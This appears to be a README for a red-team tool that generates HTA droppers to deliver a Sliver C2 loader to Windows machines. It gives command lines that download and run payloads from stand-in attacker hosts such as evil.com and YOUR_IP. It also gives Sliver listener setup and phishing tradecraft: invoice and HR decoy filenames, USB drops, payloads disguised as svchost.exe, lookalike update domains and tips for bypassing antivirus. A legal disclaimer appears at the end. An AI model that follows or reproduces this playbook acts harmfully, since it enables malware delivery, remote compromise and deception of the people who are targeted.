# HTA Generator for Sliver Loader

Dynamic HTA (HTML Application) generator with multiple delivery methods for Sliver C2 loader deployment. Supports 4 different execution techniques with full command-line customization.

[![Version](https://img.shields.io/badge/Version-2.0-blue)]()
[![Python](https://img.shields.io/badge/Python-3.6+-green)]()
[![Platform](https://img.shields.io/badge/Platform-Windows-red)]()

---

## 🎯 Features

### 4 Delivery Methods

- ✅ **Method 1: Direct Download & Execute** - Downloads from web server and executes
- ✅ **Method 2: Embedded Base64** - Self-contained with embedded payload
- ✅ **Method 3: PowerShell Cradle** - Stealthy PowerShell-based delivery
- ✅ **Method 4: VBScript Obfuscated** - Multi-stage with obfuscated variables

### Dynamic Configuration

- ✅ **Command-line flags** - No hardcoded values
- ✅ **Custom hosts** - Any IP or domain (HTTP/HTTPS)
- ✅ **Custom filenames** - Match your social engineering context
- ✅ **Custom exe names** - Control dropped filename on target
- ✅ **Batch generation** - Create all 4 methods at once
- ✅ **Interactive mode** - User-friendly prompts

---

## 📋 Prerequisites

### On Build Machine (Kali/Linux)

**Python 3.6+** (usually pre-installed)
```bash
python3 --version
```

**No external dependencies required!** Uses Python standard library only.

### On Target Machine (Windows)

- Windows 7 or later
- Internet Explorer 11+ (for HTA execution)
- PowerShell 2.0+ (for Method 3 only)

---

## 🚀 Quick Start

### Installation

```bash
# Make executable
chmod +x hta_generator.py

# Verify it works
./hta_generator.py -h
```

### Basic Usage

**Interactive Mode:**
```bash
./hta_generator.py
```

**Command-Line Mode:**
```bash
sliver > generate --mtls your-server:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
sliver > mtls -L your-server -l 8888
sliver > websites add-content --website mysite --web-path /download/update.exe --content /path/to/file/ACTUAL_FILENAME.exe --content-type application/octet-stream
./hta_generator.py -m 1 -H YOUR_IP/download/ -f update.exe -o calendar_invite.hta
```

**Generate All Methods:**
```bash
./hta_generator.py -m 5 -H YOUR_IP -f loader.exe -l ./loader.exe
```

---

## 📚 Command-Line Options

```
-m, --method      HTA delivery method (1-5)
                  1 = Direct Download & Execute
                  2 = Embedded Base64
                  3 = PowerShell Cradle
                  4 = VBScript Obfuscated
                  5 = Generate ALL methods

-H, --host        Web server host/IP
                  Examples: 192.168.1.100, https://evil.com

-f, --filename    Filename on web server
                  Example: loader.exe, update.exe

-l, --loader      Path to local loader.exe (for method 2)
                  Example: ./loader.exe

-o, --output      Output HTA filename
                  Example: invoice.hta

-e, --exename     Executable name when dropped to disk
                  Example: svchost.exe, chrome.exe

-q, --quiet       Quiet mode (minimal output)

-h, --help        Show help message
```

---

## 💡 Usage Examples

### Method 1: Direct Download

```bash
# Basic
./hta_generator.py -m 1 -H YOUR_IP/download/ -f loader.exe -o download.hta

# With HTTPS
./hta_generator.py -m 1 -H https://evil.com -f update.exe

# Custom dropped name
./hta_generator.py -m 1 -H YOUR_IP -f payload.exe -e svchost.exe
```

### Method 2: Embedded Base64

```bash
# Basic
./hta_generator.py -m 2 -l ./loader.exe -o embedded.hta

# Custom dropped name
./hta_generator.py -m 2 -l ./loader.exe -e chrome.exe
```

### Method 3: PowerShell Cradle

```bash
# Basic
./hta_generator.py -m 3 -H YOUR_IP -f loader.exe -o ps.hta

# HTTPS
./hta_generator.py -m 3 -H https://updates.evil.com -f KB5034441.exe
```

### Method 4: VBScript Obfuscated

```bash
# Basic
./hta_generator.py -m 4 -H YOUR_IP -f loader.exe -o obf.hta

# Production
./hta_generator.py -m 4 -H https://cdn.company.com -f installer.exe -e setup.exe
```

### Method 5: Generate All

```bash
# Create all 4 HTAs
./hta_generator.py -m 5 -H YOUR_IP -f loader.exe -l ./loader.exe
```

---

## 🎭 Real-World Scenarios

### Scenario 1: Email Phishing

```bash
# Self-contained HTA for email attachment
./hta_generator.py -m 2 -l ./loader.exe -e QuickBooks.exe -o Invoice_Q4_2024.hta

# Rename for social engineering
mv Invoice_Q4_2024.hta "URGENT_Invoice_Payment_Due.hta"
```

### Scenario 2: Internal Pentest

```bash
# Quick deployment during engagement
./hta_generator.py -m 3 -H YOUR_IP -f payload.exe -e svchost.exe -o update.hta -q

# Host on compromised server
python3 -m http.server 80
```

### Scenario 3: USB Drop

```bash
# Generate all methods
./hta_generator.py -m 5 -H YOUR_IP -f update.exe -l ./loader.exe -e explorer.exe

# Rename for social engineering
mv 1_download_execute.hta "Salary_Information_2024.hta"
mv 2_embedded_base64.hta "HR_Documents.hta"
mv 3_powershell_cradle.hta "Company_Policy.hta"
mv 4_vbscript_obfuscated.hta "Benefits_Package.hta"
```

### Scenario 4: Red Team Op

```bash
# Professional HTTPS setup
./hta_generator.py -m 3 \
  -H https://updates.legitimate-domain.com \
  -f KB5034441_x64.exe \
  -e WindowsUpdateHost.exe \
  -o Security_Update.hta
```

---

## 📊 Method Comparison

| Feature | Method 1 | Method 2 | Method 3 | Method 4 |
|---------|----------|----------|----------|----------|
| **Web Server** | ✅ Required | ❌ Not needed | ✅ Required | ✅ Required |
| **File Size** | ~5 KB | ~15-25 MB | ~5 KB | ~5 KB |
| **Stealth** | Medium | High | Very High | High |
| **Offline** | ❌ No | ✅ Yes | ❌ No | ❌ No |
| **PowerShell** | ❌ No | ❌ No | ✅ Yes | ❌ No |
| **Best For** | Quick | Email | Stealth | AV bypass |

---

## 🔄 Integration with Sliver

### Complete Workflow

```bash
# 1. Build Sliver loader
cd /opt/Sliver_Loader
source venv/bin/activate
./build_hybrid_stealth.sh

# 2. Generate HTA
./hta_generator.py -m 3 -H https://your-server.com -f update.exe -o payload.hta

# 3. Host loader.exe
cp loader.exe /var/www/html/update.exe
sudo systemctl start apache2

# 4. Start Sliver listener
sliver> mtls -L YOUR_IP -l 8888

# 5. Deliver HTA and wait for callback
sliver> sessions
```

---

## 🛡️ OPSEC Tips

### Good HTA Names
- `Invoice_2024_Q4.hta`
- `Security_Update_KB5034441.hta`
- `HR_Benefits_Package.hta`
- `Company_Policy_2024.hta`

### Good Dropped Exe Names
- `svchost.exe`
- `explorer.exe`
- `chrome.exe`
- `WindowsUpdate.exe`

### Good URLs
- `https://cdn.company.com/update.exe`
- `https://updates.microsoft-cdn.net/KB5034441.exe`

---

## 🔧 Troubleshooting

### No Callback

**Check:**
1. Web server running: `python3 -m http.server 80`
2. Target can reach server: `ping YOUR_IP`
3. Sliver listener active: `sliver> jobs`
4. Correct URL hosted

### HTA Doesn't Execute

**Causes:**
- User opened in text editor
- HTA execution disabled
- Antivirus blocked
- No Internet Explorer

**Solutions:**
- Instruct user to double-click
- Try different method
- Test on different Windows version

---

## ⚠️ Legal Warning

**Use ONLY for authorized security testing!**

Unauthorized use is:
- 🚫 Illegal
- 🚫 Subject to prosecution under CFAA
- 🚫 Unethical

**Required:**
- ✅ Written authorization
- ✅ Defined scope
- ✅ Legal review

**Get permission. Document everything. Stay legal.**

---

## 📞 Support

For issues:
- Check Troubleshooting section
- Verify prerequisites
- Test in isolated environment

For Sliver questions:
- https://github.com/BishopFox/sliver

---

## 🎯 Quick Reference

```bash
# Interactive mode
./hta_generator.py

# Download method
./hta_generator.py -m 1 -H YOUR_IP/download -f loader.exe -o download.hta

# Embedded method
./hta_generator.py -m 2 -l ./loader.exe

# PowerShell method
./hta_generator.py -m 3 -H https://evil.com -f update.exe

# Generate all
./hta_generator.py -m 5 -H YOUR_IP -f loader.exe -l ./loader.exe

# Help
./hta_generator.py -h
```

---

**Built for red teamers. Use responsibly. Stay legal.** 🎯

*Last Updated: February 2026*
